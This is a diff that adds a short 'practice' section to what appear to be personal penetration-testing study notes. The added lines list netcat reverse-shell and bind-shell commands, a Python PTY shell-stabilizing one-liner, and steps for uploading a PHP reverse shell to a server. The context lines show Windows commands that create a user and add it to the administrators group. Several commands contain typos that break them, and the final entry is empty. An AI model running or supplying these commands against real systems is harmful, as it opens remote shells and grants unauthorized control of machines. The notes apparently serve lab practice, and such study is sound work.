@@ -1016,6 +1016,24 @@ windos add user:
 - ``` net user <username> <password> /add ```
 - ``` net localgroup administrators <username> /add ```
 
+**practice**
+p1
+- ``` nc -lnvp 4444 ``` on attacker.
+- ``` NC <yourmachineip> -e /bin.bash ``` on target.
+- ``` python3 -c 'import pty;pty.spawn("/bin/bash")' ``` on attacker, stabilize 
 
+p2
+- ``` /usr/share/webshells/php/php-reverse-shell.php ``` change the IP to attacker`s.
+- ``` nc -lnvp 1234 ``` on attacker.
+- upload ``` php-reverse-shell.php ``` to server and run it.
 
+p3(REVERSE SHELL)
+- ``` nc -lvnp 4444 ``` attacker’s 
+- ``` nc <tun0-ip> 4444-e /bin/bash ``` target’s 
 
+p3(BIND SHELL)
+- ``` nc  -lvnp 4444-e /bin/bash ``` target’s terminal
+- ``` nc <target-ip> 4444 ``` attacker’s terminal
+
+p4
+- 
